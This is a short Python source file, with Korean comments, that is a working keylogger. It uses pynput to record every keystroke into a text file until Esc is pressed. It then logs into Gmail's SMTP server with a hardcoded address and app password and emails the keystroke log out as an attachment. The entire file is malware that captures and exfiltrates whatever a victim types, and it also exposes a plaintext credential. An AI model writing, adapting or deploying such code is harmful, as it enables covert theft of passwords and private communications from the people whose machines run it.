from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


with open("logger.txt", "w") as l:

    def on_press(key):

        global count
        if key == keyboard.Key.esc:
            return False

        print("{}".format(key))
        l.write(str(key))

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

s = smtplib.SMTP('smtp.gmail.com', 587)
s.starttls()
s.login('mjdh1936@gmail.com', 'avgtybdtvdnfptlq')

# 제목, 본문 작성
msg = MIMEMultipart()
msg['Subject'] = '제목'
msg.attach(MIMEText('본문', 'plain'))

# 파일첨부 (파일 미첨부시 생략가능)
attachment = open("logger.txt", 'rb')
part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= " + "logger.txt")
msg.attach(part)

# 메일 전송
s.sendmail("mjdh1936@gmail.com", "mjdh1936@gmail.com", msg.as_string())
s.quit()